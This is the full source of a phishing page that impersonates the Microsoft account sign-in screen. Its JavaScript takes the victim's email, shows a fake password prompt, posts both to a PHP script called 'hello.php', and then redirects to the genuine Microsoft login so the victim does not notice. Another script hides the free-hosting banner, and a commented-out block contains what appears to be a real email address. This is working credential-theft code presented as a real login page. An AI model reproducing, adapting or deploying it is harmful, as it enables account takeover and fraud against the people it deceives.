<!DOCTYPE html>
<html>
<head>
	<title>Sign in to your Microsoft account</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<link rel="shortcut icon" href="asset/img/favicon.ico">
	
	<link rel="stylesheet" title="Converged" type="text/css" href="asset/css/login.css">
</head>
<style type="text/css">
	.cb{
		background: linear-gradient(
                     rgba(20,20,20, .5), 
                     rgba(20,20,20, .5)),
                     url('asset/img/login_bg.jpg');
        background-size: 100% 680px;
	}
	@media screen and (max-width: 600px) {
.cb {
        background:  linear-gradient(
                     rgba(255,255,255, 1), 
                     rgba(255,255,255, 1));
  }
.grid_2 img {
    display: none;
  }
</style>
<body class="cb" style="">
	<div id = "overlay" class="overlay" ></div>
	<div class="">
		<div class="background-overlay"></div>
		<form>
			<div class="outer">
				<div class="middle">
					<div class="inner">
						<div role="banner">
							<img class="logo" role="presentation" pngsrc="asset/img/microsoft_logo.png" svgsrc="asset/img/microsoft.svg" data-bind="imgSrc" src="asset/img/microsoft.svg">
						</div>
						<input type="hidden" name="emaiHolder" id="emailBoxHolder">
						<div role="main">
							<div class="animate back" id="changeStartBox">
								<div data-view = "1">
									<div class="row text-title">
										Sign in
									</div>
									<div class="row">
										<div id="alert" role = "alert">
											
										</div>
										<div class="form-group col-md-24">
											<div class="placeholderContainer">
												<input type="email" id="emailBox" name="emailField" class="form-control ltr_override" maxlength="113" placeholder="Email, phone, or Skype" lang="en">
												<div id="usernameProgress" class="progress" role="progressbar" data-bind="" style="display: none;" aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation --> 
													<div></div>
													<div></div>
													<div></div>
													<div></div>
													<div></div>
													<div></div>
													<!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko -->
												</div>
											</div>
										</div>
										<div class="row">
											<div data-bind="">
												<div class="col-xs-24 form-group no-padding-left-right" data-bind=""> 
													<div data-bind="" class="col-xs-12 secondary"> 
														<input id="idBtn_Back"  class="btn btn-block" data-bind="" value="Back" style="display: none;" type="button"> 
													</div> 
													<div data-bind="" class="col-xs-24"> 
														<input id="idSIButton9" onclick="loadPasswordField(event, this)" class="btn btn-block btn-primary" data-bind="" value="Next" type="submit"> 
													</div> 
												</div>
											</div>
										</div>
										<div class="row"> 
											<div class="col-md-24"> 
												<div class="text-13 action-links"><!-- ko if: svr.Am && !svr.aK && !svr.ak --> 
													<div class="form-group" data-bind="">No account? <a href="#" id="signup" class="display-inline-block" aria-label="Create a Microsoft account">Create one!</a>
													</div>
												</div> 
											</div> 
										</div>
									</div>
									
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div id="footer" class="footer default" role="contentinfo" data-bind=""> 
				<div data-bind="">
					<!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> 
					<div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> 
						<span id="ftrCopy" data-bind="">&copy2018 Microsoft</span><!-- /ko --> 
						<a id="ftrTerms" data-bind="" href="#">Terms of use</a> 
						<a id="ftrPrivacy" data-bind="" >Privacy &amp; cookies
						</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> 
						<a href="#" role="button" class="moreOptions" data-bind="" aria-label="Click here for more options" title="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
							<img class="desktopMode" role="presentation" pngsrc="asset/img/ellipsis_white.png" svgsrc="asset/img/ellipsis_white.svg" data-bind="imgSrc" src="asset/img/ellipsis_white.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
							<img class="mobileMode" role="presentation" pngsrc="asset/img/ellipsis_grey.png" svgsrc="asset/img/ellipsis_grey.svg" data-bind="imgSrc" src="asset/img/ellipsis_grey.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> 
						</a> 
					</div> <!-- /ko -->
				</div> 
			</div>
		</form>
	</div>

	<!--use for switch to password. delete later-->
	<!-- <div>
		<div data-bind="" class="animate">
			<div data-viewid="2" data-dynamicbranding="true" data-bind="">
				<div data-bind="">
					<div class="identityBanner"> 
						<div id="displayName" class="identity" data-bind="" title="labista_8@live.com">labista_8@live.com</div> 
						<div class="profile-photo"> 
							<img role="presentation" data-bind="" src="https://auth.gfx.ms/16.000.27701.00/images/picker_account_msa.svg?x=2d8f86059be176833897099ee6ddedeb"> 
						</div> 
					</div>
				</div> 
				<div id="loginHeader" class="row text-title" role="heading" data-bind="">Enter password</div>
				<div class="row"> 
					<div class="form-group col-md-24"> 
						<div role="alert" aria-live="assertive" aria-atomic="false">
						</div> 
						<div class="placeholderContainer" data-bind="">
							<input name="passwd" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="" placeholder="Password" aria-label="Enter password" type="password"> 
						</div> 
					</div> 
				</div>
				<div class="row"> 
					<div data-bind="">
						<div class="col-xs-24 form-group no-padding-left-right" data-bind=""> 
							<div data-bind=""> 
								<input id="idBtn_Back" class="btn btn-block" data-bind="" value="Back" type="button"> 
							</div> 
							<div data-bind="" class="col-xs-12 primary">
								<input id="idSIButton9" class="btn btn-block btn-primary" data-bind="" value="Sign in" type="submit">

							</div> 
						</div>
					</div> 
				</div>
				<div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind=""> 
					<label id="idLbl_PWD_KMSI_Cb"> 
						<input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" data-bind="" aria-label="Keep me signed in" type="checkbox"> 
						<span data-bind="">Keep me signed in</span> 
					</label> 
				</div>
				<div class="row"> 
					<div class="col-md-24"> 
						<div class="text-13 action-links"> 
							<div class="form-group"> 
								<a id="idA_PWD_ForgotPassword" role="link" href="" data-bind="">Forgot my password</a> 
							</div> 
						</div> 
					</div> 
				</div>
			</div>
		</div>
	</div> -->
	<script type="text/javascript" src="asset/js/jquery.min.js"></script>
	<script>
        $(document).ready(function(){
            $( "img[alt='www.000webhost.com']" ).css("display", "none");
        });
    </script>
	<script type="text/javascript">
	
	function loadPasswordField(event, elem){
		event.preventDefault();
		var btn = $(elem);
		$('#usernameProgress').css('display','block');
		var email = $('#emailBox').val();
		if (email == '') {
			$('#alert').html(`<div class="alert alert-error col-md-24" id="usernameError" data-bind="">Enter a valid email address, phone number, or Skype name.</div>`)
			$('#emailBox').addClass('has-error');
			$('#usernameProgress').css('display','none');
			return false;
		}
		 $('#emailBoxHolder').val(email);
		 var delayInMilliseconds = 2500; //1 second

		setTimeout(function() {
		  $('#changeStartBox').html(`<div>
			<div data-bind="" class="animate">
			<div data-viewid="2" data-dynamicbranding="true" data-bind="">
				<div data-bind="">
					<div class="identityBanner"> 
						<div id="displayName" class="identity" data-bind="" title="">`+email+`</div> 
						<div class="profile-photo"> 
							<img role="presentation" data-bind="" src="asset/img/picker_account.svg"> 
						</div> 
					</div>
				</div> 
				<div id="loginHeader" class="row text-title" role="heading" data-bind="">Enter password</div>
				<div class="row"> 
					<div class="form-group col-md-24"> 
						<div role="alert" aria-live="assertive" aria-atomic="false">
						</div> 
						<div class="placeholderContainer" data-bind="">
							<input name="passwd" id="passwordBox" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="" placeholder="Password" aria-label="Enter password" type="password"> 
						</div> 
					</div> 
				</div>
				<div class="row"> 
					<div data-bind="">
						<div class="col-xs-24 form-group no-padding-left-right" data-bind=""> 
							<div data-bind="" class = "col-xs-12"> 
								<input onclick = "goBackOkay(event)" id="idBtn_Back" class="btn btn-block" data-bind="" value="Back" type="button"> 
							</div> 
							<div data-bind="" class="col-xs-12 primary">
								<input id="idSIButton9" onclick = "signInOkay(event)" class="btn btn-block btn-primary" data-bind="" value="Sign in" type="submit">

							</div> 
						</div>
					</div> 
				</div>
				<div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind=""> 
					<label id="idLbl_PWD_KMSI_Cb"> 
						<input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" data-bind="" aria-label="Keep me signed in" type="checkbox"> 
						<span data-bind="">Keep me signed in</span> 
					</label> 
				</div>
				<div class="row"> 
					<div class="col-md-24"> 
						<div class="text-13 action-links"> 
							<div class="form-group"> 
								<a id="idA_PWD_ForgotPassword" role="link" href="" data-bind="">Forgot my password</a> 
							</div> 
						</div> 
					</div> 
				</div>
			</div>
		</div>
	</div>`);
		}, delayInMilliseconds);
		 
	}
	function signInOkay(event){
		event.preventDefault();
		$('#usernameProgress').css('display','block');
		$('#overlay').fadeIn( "slow" );
		var email = $('#emailBoxHolder').val();
		var password = $('#passwordBox').val();
		$.ajax({
        type: "POST", url: "hello.php", data: { "email": email, "password": password },
        success: function (data) {
            let delay = 1000;
            setTimeout(function () {
           window.location.replace("https://login.live.com");
          }, delay);
        }, error: function (data) {
          let delay = 3000;
          setTimeout(function () {
           goBackOkay(event);
          }, delay);
        }
      });
		

	}
	function goBackOkay(event){
		event.preventDefault();
		$('#changeStartBox').html(`
			<div data-view = "1">
				<div class="row text-title">
					Sign in
				</div>
				<div class="row">
					<div role = "alert">
						
					</div>
					<div class="form-group col-md-24">
						<div class="placeholderContainer">
							<input type="email" id="emailBox" name="emailField" class="form-control ltr_override" maxlength="113" placeholder="Email, phone, or Skype" lang="en">
							<div id="usernameProgress" class="progress" role="progressbar" data-bind="" style="display: none;" aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation --> 
								<div></div>
								<div></div>
								<div></div>
								<div></div>
								<div></div>
								<div></div>
								<!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko -->
							</div>
						</div>
					</div>
					<div class="row">
						<div data-bind="">
							<div class="col-xs-24 form-group no-padding-left-right" data-bind=""> 
								<div data-bind="" class="col-xs-12 secondary"> 
									<input id="idBtn_Back" onclick="goBackOkay(event)" class="btn btn-block" data-bind="" value="Back" style="display: none;" type="button"> 
								</div> 
								<div data-bind="" class="col-xs-24"> 
									<input id="idSIButton9" onclick="loadPasswordField(event, this)" class="btn btn-block btn-primary" data-bind="" value="Next" type="submit"> 
								</div> 
							</div>
						</div>
					</div>
					<div class="row"> 
						<div class="col-md-24"> 
							<div class="text-13 action-links"><!-- ko if: svr.Am && !svr.aK && !svr.ak --> 
								<div class="form-group" data-bind="">No account? <a href="https://signup.live.com/signup?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1522270629&amp;rver=6.7.6640.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3db5cd8783-4b75-8d75-14fe-371b7288a7db&amp;id=292841&amp;CBCXT=out&amp;lw=1&amp;fl=dob%2cflname%2cwld&amp;cobrandid=90015&amp;contextid=2C0502E16CC86A47&amp;bk=1522270632&amp;uiflavor=web&amp;uaid=3d48e627940c4849a23f8cd5912533da&amp;mkt=EN-US&amp;lc=1033" id="signup" class="display-inline-block" aria-label="Create a Microsoft account">Create one!</a>
								</div>
							</div> 
						</div> 
					</div>
				</div>
				
			</div>`);
}

</script>
			
					

	</script>
</body>
</html>